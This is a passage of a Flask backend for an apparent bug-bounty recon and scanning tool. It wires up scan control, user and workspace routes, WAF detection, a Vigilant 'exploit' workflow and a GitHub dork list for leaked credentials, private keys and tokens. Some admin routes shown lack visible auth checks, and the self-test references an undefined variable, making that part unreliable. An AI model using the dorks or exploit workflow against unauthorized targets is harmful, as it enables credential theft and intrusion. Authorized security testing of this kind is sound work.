    sess = _sess(d)
    if sess["recon_q"]: sess["recon_q"].put(None)
    if sess["scan_q"]:  sess["scan_q"].put(None)
    # Signal scanner cooperative cancellation
    try:
        from scanner import _scan_stop
        _scan_stop.set()
    except: pass
    return jsonify({"ok": True})

# ── Data endpoints ────────────────────────────────────────────────────────────


@app.route("/stop_recon", methods=["POST","GET"])
def stop_recon_route():
    """Stop recon SSE stream. Called by stopRecon() in frontend."""
    # Handle any Content-Type — frontend may send without application/json
    try:
        body = request.get_json(silent=True, force=True) or {}
    except Exception:
        body = {}
    d = _domain(body.get("domain","") or request.args.get("domain","") or request.form.get("domain",""))
    sess = _sess(d)
    if sess.get("recon_q"): sess["recon_q"].put(None)
    # Also stop any scan queue
    if sess.get("scan_q"): sess["scan_q"].put(None)
    return jsonify({"ok": True, "stopped": "recon", "domain": d})


@app.route("/stop_scan", methods=["POST","GET"])
def stop_scan_route():
    """Stop scan SSE stream for a specific domain only."""
    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain","") or request.args.get("domain",""))
    sess = _sess(d)
    # Signal the domain-specific scan to stop (doesn't affect other scans)
    if d:
        try:
            from scanner import _set_stop_event
            _set_stop_event(d)
        except Exception: pass
    if sess.get("scan_q"): sess["scan_q"].put(None)
    return jsonify({"ok": True, "stopped": "scan"})


@app.route("/tool_status")
def tool_status():
    """Return tool availability. Cached 60s, refreshed in background."""
    import time as _t
    now = _t.time()
    with _tool_status_lock:
        cached = _tool_status_cache.get("data")
        ts     = _tool_status_cache.get("ts", 0)
    # Serve cached if fresh (60s)
    if cached and now - ts < 60:
        return jsonify(cached)
    # Stale or empty — trigger background refresh, return stub immediately
    threading.Thread(target=_refresh_tool_status, daemon=True, name="tool-status-refresh").start()
    if cached:
        return jsonify(cached)   # return stale while refreshing
    # First call before warmup completes — return minimal stub
    return jsonify({"tools":{},"total":0,"available":0,"missing":[],"loading":True})


# ── Health check ──────────────────────────────────────────────────────────────


@app.route("/users", methods=["GET"])
def rbac_list_users():
    try:
        from engine.auth_rbac import get_user_db
        udb = get_user_db(db.root.parent if hasattr(db,"root") else "./data")
        return jsonify({"users": udb.list_users()})
    except Exception as e:
        return jsonify({"error":str(e)}), 500



@app.route("/users/create", methods=["POST"])
def rbac_create_user():
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.auth_rbac import get_user_db
        udb  = get_user_db(db.root.parent if hasattr(db,"root") else "./data")
        user = udb.create_user(
            payload.get("username",""),
            payload.get("password",""),
            payload.get("role","analyst"),
            payload.get("email",""))
        return jsonify({"ok":True,"user":user})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


@app.route("/users/sessions")
def rbac_sessions():
    try:
        from engine.auth_rbac import get_user_db
        udb = get_user_db(db.root.parent if hasattr(db,"root") else "./data")
        return jsonify({"sessions": udb.get_active_sessions()})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# TEAM COLLABORATION
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/waf_detect", methods=["POST"])
def waf_detect():
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    url     = payload.get("url","")
    if not url:
        hosts = db.get_hosts(d).get("active",[])
        url   = hosts[0] if hosts else f"https://{d}"
    try:
        waf_info = detect_waf(url)
        _sess(d)["waf"] = waf_info
        db.save_meta(d, {"waf": waf_info})
        return jsonify(waf_info)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── ASN expansion ─────────────────────────────────────────────────────────────


@app.route("/workspaces", methods=["GET"])
def list_workspaces():
    username = request.args.get("user","admin")
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        return jsonify({"workspaces": cdb.get_workspaces(username)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/workspaces/<ws_id>/members", methods=["POST"])
def add_workspace_member(ws_id):
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        cdb.add_member(ws_id, payload.get("username",""),
                       payload.get("role","analyst"), payload.get("added_by","admin"))
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


@app.route("/workspaces/create", methods=["POST"])
def create_workspace():
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        ws  = cdb.create_workspace(
            payload.get("name",""),
            payload.get("created_by","admin"),
            payload.get("description",""))
        return jsonify({"ok":True,"workspace":ws})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


# ══════════════════════════════════════════════════════════════════════
# VIGILANT INTEGRATION — Ruby automation framework + gitdorks
# ══════════════════════════════════════════════════════════════════════

@app.route("/vigilant/status", methods=["GET"])
def vigilant_status():
    """Check if Vigilant is installed and ready."""
    import shutil
    vigilant_bin  = shutil.which("vigilant") or "/root/vigilant/vigilant.rb"
    ruby_bin      = shutil.which("ruby")
    gitdorks_path = os.path.expanduser("~/Desktop/recon/gitdorks.sh")

    tools_present = {}
    for t in ["subfinder","subjack","httprobe","nuclei","dalfox","waybackurls",
              "gau","gospider","anew","altdns","dnsgen","byp4xx"]:
        tools_present[t] = bool(shutil.which(t))

    return jsonify({
        "installed": bool(shutil.which("vigilant") or os.path.exists("/root/vigilant/vigilant.rb")),
        "vigilant_installed": os.path.exists(vigilant_bin),
        "vigilant_path":      vigilant_bin,
        "ruby_installed":     bool(ruby_bin),
        "gitdorks_present":   os.path.exists(gitdorks_path),
        "tools_ready":        tools_present,
        "tools_ok":           sum(tools_present.values()),
        "tools_total":        len(tools_present),
    })


@app.route("/vigilant/run", methods=["POST"])
def vigilant_run():
    """
    Launch a Vigilant workflow. Streams output via SSE.
    Workflows: enum | web-host | endpoint | exploit | full
    Modules:   --resolve --brt --dns --takeover --cors --nuclei --js --github
               --dir --ports --visual --xss --aws --waf --info etc.
    """
    import queue as _q, threading, shutil
    if request.is_json:
        p = request.get_json(silent=True) or {}
    else:
        p = request.get_json(force=True, silent=True) or {}
        if not p:
            try:
                import json as _j; p = _j.loads(request.data or b"{}")
            except Exception: p = {}
    domain   = _domain(p.get("domain",""))
    workflow = p.get("workflow","enum")    # enum | web-host | endpoint | exploit | full
    modules  = p.get("modules",[])        # extra flags e.g. ["--takeover","--cors"]
    project  = p.get("project", domain.replace(".","_"))

    if not domain:
        return jsonify({"error":"domain required"}), 400

    ruby     = shutil.which("ruby")
    vig_path = "/root/vigilant/vigilant.rb"

    # Auto-install from app directory if not yet in /root/vigilant/
    if ruby and not os.path.exists(vig_path):
        _app_dir = os.path.dirname(os.path.abspath(__file__))
        for src_name in ["vigilant.rb", "vigilant__2_.rb"]:
            src = os.path.join(_app_dir, src_name)
            if os.path.exists(src):
                os.makedirs("/root/vigilant/scripts", exist_ok=True)
                import shutil as _sh
                _sh.copy(src, vig_path)
                os.chmod(vig_path, 0o755)
                # Install functions.rb too
                for fn in ["functions.rb", "functions__2_.rb", "scripts/functions.rb"]:
                    fn_src = os.path.join(_app_dir, fn)
                    if os.path.exists(fn_src):
                        _sh.copy(fn_src, "/root/vigilant/scripts/functions.rb")
                        break
                log.info("[vigilant] Auto-installed from app directory")
                break

    if not ruby or not os.path.exists(vig_path):
        return jsonify({"error": (
            "Vigilant not installed. Run: sudo ./fix_failed_tools.sh  "
            "or copy vigilant.rb → /root/vigilant/vigilant.rb"
        )}), 503

    cmd = [ruby, vig_path, "-d", domain, "-p", project, f"--{workflow}"] + modules
    log.info(f"[vigilant] Launching: {' '.join(cmd)}")

    q = _q.Queue()
    def _run():
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, cwd="/root/vigilant", bufsize=1,
            )
            for line in proc.stdout:
                q.put({"type":"vigilant_output","line":line.rstrip()})
            proc.wait()
            q.put({"type":"vigilant_done","code":proc.returncode,"domain":domain})
        except Exception as e:
            q.put({"type":"vigilant_error","error":str(e)})
        finally:
            q.put(None)

    threading.Thread(target=_run, daemon=True, name=f"vigilant-{domain}").start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/vigilant/gitdorks", methods=["POST"])
def vigilant_gitdorks():
    """
    Generate GitHub dork search links for a domain.
    Returns ready-to-click URLs for secrets, credentials, tokens etc.
    """
    # Accept JSON or form data (curl default sends no Content-Type)
    if request.is_json:
        p = request.get_json(silent=True) or {}
    else:
        p = request.get_json(force=True, silent=True) or {}
        if not p:
            p = request.form.to_dict() or {}
            # Also check raw body: {"domain":"..."}
            if not p:
                try:
                    import json as _j
                    p = _j.loads(request.data or b"{}") 
                except Exception:
                    p = {}
    domain = _domain(p.get("domain",""))
    if not domain:
        return jsonify({"error":"domain required. Add -H 'Content-Type: application/json'"}), 400

    # Generate dorks inline (no need to run the bash script)
    without_suffix = domain.split(".")[0]
    targets = [domain, without_suffix]
    DORK_TYPES = [
        ("password",        "password"),
        ("npmrc _auth",     "npmrc%20_auth"),
        ("aws_access_key",  "aws_access_key_id"),
        ("SECRET_KEY",      "SECRET_KEY"),
        ("api_key",         "api_key"),
        ("github_token",    "github_token"),
        ("client_secret",   "client_secret"),
        ("credentials",     "credentials"),
        ("id_rsa",          "id_rsa"),
        ("pem private",     "pem%20private"),
        ("s3cfg",           "s3cfg"),
        ("htpasswd",        "htpasswd"),
        ("git-credentials", "git-credentials"),
        ("xoxp OR xoxb",    "xoxp%20OR%20xoxb"),
        ("bashrc password", "bashrc%20password"),
        ("sshd_config",     "sshd_config"),
        ("dockercfg",       "dockercfg"),
        ("passwd",          "passwd"),
        ("secrets",         "secrets"),
        ("mysql",           "mysql"),
        (".env file",       ".env"),
        ("deploy.rake",     "deploy.rake"),
        ("PWD",             "PWD"),
        ("bash_history",    ".bash_history"),
        ("app_secret",      "app_secret"),
        ("FTP",             "FTP"),
    ]

    dorks = []
    for label, query in DORK_TYPES:
        dorks.append({
            "label": label,
            "urls": [
                f"https://github.com/search?q=%22{t}%22+{query}&type=Code"
                for t in targets
            ]
        })

    return jsonify({
        "domain":    domain,
        "dorks":     dorks,
        "count":     len(dorks),
        "tip": "Open these in a logged-in GitHub browser for best results",
    })


@app.route("/vigilant/workflows", methods=["GET"])
def vigilant_workflows():
    """List available Vigilant workflows and module flags."""
    return jsonify({
        "workflows": {
            "enum":     "Full domain enumeration (subdomains, IPs, ports, DNS)",
            "web-host": "Full web host scan (httprobe, screenshots, WAF, CORS)",
            "endpoint": "Endpoint discovery (URLs, JS, parameters, broken links)",
            "exploit":  "Exploitation phase (XSS, SQLi, CORS, SSRF, nuclei)",
            "full":     "All workflows sequentially",
        },
        "modules": [
            "--resolve    DNS resolution of all subdomains",
            "--brt        Subdomain bruteforce (puredns + altdns)",
            "--dns        Passive DNS recon",
            "--takeover   Subdomain takeover check (subjack + tko-subs)",
            "--cors       CORS misconfiguration scanner",
            "--nuclei     Full nuclei vulnerability scan",
            "--js         JavaScript analysis (secrets, endpoints, linkfinder)",
            "--github     GitHub secret hunting (gitGraber + git-hound)",
            "--dir        Directory fuzzing (dirsearch)",
            "--ports      Port scan (masscan + nmap)",
            "--visual     Screenshots (aquatone)",
            "--xss        XSS scanning (dalfox + kxss)",
            "--aws        S3 bucket enumeration",
            "--waf        WAF fingerprinting (wafw00f)",
            "--info       WHOIS, ASN, SPF, DNS info",
            "--vhost      Virtual host enumeration",
            "--backups    Backup file discovery",
            "--broken     Broken link checker",
            "--crlf       CRLF injection scanner",
            "--ssrf       SSRF scanner",
            "--params     Parameter discovery (arjun)",
        ],
        "example": {
            "url":  "POST /vigilant/run",
            "body": {"domain":"target.com","workflow":"enum","modules":["--takeover","--cors"]},
        },
    })

# Pre-warm OOB client at startup — so first /oob_host is instant instead of 2.5s
try:
    def _prewarm_oob():
        try:
            from engine.oob import get_oob_client
            get_oob_client()
            log.info("[oob] pre-warmed at startup")
        except Exception as _oe:
            log.debug(f"[oob] prewarm: {_oe}")
    threading.Thread(target=_prewarm_oob, daemon=True, name="oob-prewarm").start()
except Exception:
    pass

# Ensure default admin user exists on startup (works with both gunicorn and dev server)
try:
    from engine.rbac import _ensure_admin as _ea
    _ea()
    _setup_req = os.environ.get("TMR_SETUP_REQUIRED", "")
    if _setup_req:
        log.info("[auth] First-run setup: admin account created — see startup output for credentials")
    else:
        log.info("[auth] Admin account ready (credentials set via TMR_ADMIN_PASSWORD)")
except Exception as _ae:
    log.debug(f"[auth] {_ae}")

# Load RAG vector index on startup (if data exists)
try:
    from engine.rag_db import build_index as _rag_build
    _n = _rag_build()
    if _n > 0:
        log.info(f"[rag] Vector index loaded: {_n} reports")
    else:
        log.info("[rag] RAG DB empty — run POST /rag/ingest to load H1 reports")
except Exception as _re:
    log.debug(f"[rag] startup index: {_re}")

def runtime_selftest() -> bool:
    """
    Startup self-test — validate all critical components load and initialize.
    Called once at startup. Returns True if all critical checks pass.
    Logs each failure but does not crash the app.
    """
    import time as _st
    t0 = _st.time()
    failures: list = []
    passed:   int  = 0

    def _check(name: str, fn):
        nonlocal passed
        try:
            fn()
            passed += 1
        except Exception as e:
            failures.append({"check": name, "error": str(e)[:120]})
            log.warning(f"[startup] selftest failed: check={name} error={e}")

    # 1. DB opens and basic operations work
    _check("db_open",         lambda: db.count_endpoints("__selftest__"))

    # 2. Scanner imports cleanly
    _check("scanner_import",  lambda: __import__("scanner"))

    # 3. run_scan is callable
    _check("run_scan_callable", lambda: (
        __import__("scanner").__dict__.get("run_scan") or
        (_ for _ in ()).throw(RuntimeError("run_scan not found in scanner"))
    ))

    # 4. recon imports cleanly
    _check("recon_import",    lambda: __import__("recon"))

    # 5. run_recon is callable
    _check("run_recon_callable", lambda: (
        __import__("recon").__dict__.get("run_recon") or
        (_ for _ in ()).throw(RuntimeError("run_recon not found in recon"))
    ))

    # 6. Tool resolution works (shutil.which must be usable)
    _check("which_shutil",    lambda: __import__("shutil").which("sh"))

    # 7. safe_proc wrappers available
    _check("safe_proc",       lambda: __import__("engine.safe_proc", fromlist=["safe_run_process"]))

    # 8. Nuclei engine imports
    _check("nuclei_engine",   lambda: __import__("engine.nuclei_engine", fromlist=["get_binary"]))

    # 9. OOB engine imports safely
    _check("oob_engine",      lambda: __import__("engine.oob", fromlist=["get_oob_host"]))

    # 10. Payload intel available
    _check("payload_intel",   lambda: __import__("engine.payload_intel", fromlist=["select_payloads"]))

    # 11. Scan queue workers are/will be alive
    _check("scan_queue",      lambda: _scan_queue)

    # 12. No undefined T in scanner.py  
    _check("scanner_no_bare_T", lambda: (
        None if "T.get(" not in open("scanner.py").read().replace(
            'T[0-9A-Z]', ''  # exclude regex literals
        ) else (_ for _ in ()).throw(RuntimeError("bare T reference in scanner.py"))
    ))

    # 13. ai_validator importable
    _check("ai_validator", lambda: __import__(
        "engine.ai_validator", fromlist=["ai_validate_finding"]
    ))

    if failures:
        log.warning(f"[startup] selftest: {passed} passed, {len(failures)} FAILED"
                    f" in {dur}ms — {[f['check'] for f in failures]}")
    else:
        log.info(f"[startup] selftest: {passed}/{passed+len(failures)} checks passed"
                 f" in {dur}ms — runtime OK")

    return len(failures) == 0


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 9865))

    # ── .env startup diagnostics ──────────────────────────────────────────
    _env_file = Path(__file__).parent / ".env"
    _env_file_exists = _env_file.is_file()
    log.info(
        f"[env] .env file: {'found' if _env_file_exists else 'MISSING — create .env from .env.example'}"
        f" | vars injected this session: {_env_vars_loaded}"
    )

    # Show which API keys are actually in the process environment
    _API_KEYS = {
        "ANTHROPIC_API_KEY":      "Claude AI",
        "SHODAN_API_KEY":         "Shodan",
        "SECURITYTRAILS_API_KEY": "SecurityTrails",
        "VT_API_KEY":             "VirusTotal",
        "CENSYS_API_ID":          "Censys",
        "CENSYS_API_SECRET":      "Censys secret",
        "CHAOS_API_KEY":          "ProjectDiscovery Chaos",
        "NETLAS_API_KEY":         "Netlas",
        "ZOOMEYE_API_KEY":        "ZoomEye",
        "FOFA_EMAIL":             "FOFA email",
        "FOFA_KEY":               "FOFA key",
        "HUNTER_API_KEY":         "Hunter.io",
        "GITHUB_TOKEN":           "GitHub",
        "H1_API_TOKEN":           "HackerOne",
        "OOB_HOST":               "OOB/BXSS host",
        "INTERACTSH_SERVER":      "Interactsh server",
        "URLSCAN_API_KEY":        "urlscan.io",
        "VIRUSTOTAL_API_KEY":     "VirusTotal (alt)",
        "BINARYEDGE_API_KEY":     "BinaryEdge",
    }
    _present = [name for name, desc in _API_KEYS.items() if os.environ.get(name,"")]
    _missing  = [name for name, desc in _API_KEYS.items() if not os.environ.get(name,"")]
    log.info(f"[env] API keys loaded ({len(_present)}/{len(_API_KEYS)}): {', '.join(_present) or 'NONE'}")
    if _missing:
        log.info(f"[env] API keys missing ({len(_missing)}): {', '.join(_missing)}")

    # Start background monitor — schedules + alerts + diff
    try:
        from engine.monitor import start_monitor
        from scanner import run_scan as _run_scan_fn
        start_monitor(_run_scan_fn)
        log.info('[monitor] background thread started')
    except Exception as _me:
        log.warning(f'[monitor] failed to start: {_me}')
    # Run startup self-test in background — doesn't delay server start
    import threading as _st_t
    _st_t.Thread(target=runtime_selftest, daemon=True, name="startup-selftest").start()
    # Start CVE sync in background (CISA KEV + NVD last 30d)
    try:
        from engine.cve_sync import start_background_sync, schedule_weekly_sync
        start_background_sync("startup")   # fast: CISA KEV + recent NVD
        schedule_weekly_sync()             # full sweep every 7 days
        log.info("[cve_sync] background sync started")
    except Exception as _cs_err:
        log.warning(f"[cve_sync] startup error: {_cs_err}")
    # Start continuous monitoring scheduler
    try:
        start_scheduler(db)
        log.info("[monitoring] scheduler started")
    except Exception as _ms_err:
        log.warning(f"[monitoring] scheduler failed to start: {_ms_err}")
    # Schedule periodic DB vacuum (weekly) in background
    def _db_vacuum_loop():
        import time as _vt
        _vt.sleep(3600)  # wait 1h after start before first vacuum
        while True:
            try: db.vacuum()
            except Exception: pass
            _vt.sleep(7 * 24 * 3600)  # weekly
    _st_t.Thread(target=_db_vacuum_loop, daemon=True, name="db-vacuum").start()
    log.info(f'BugScan ELITE — http://0.0.0.0:{port}')
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
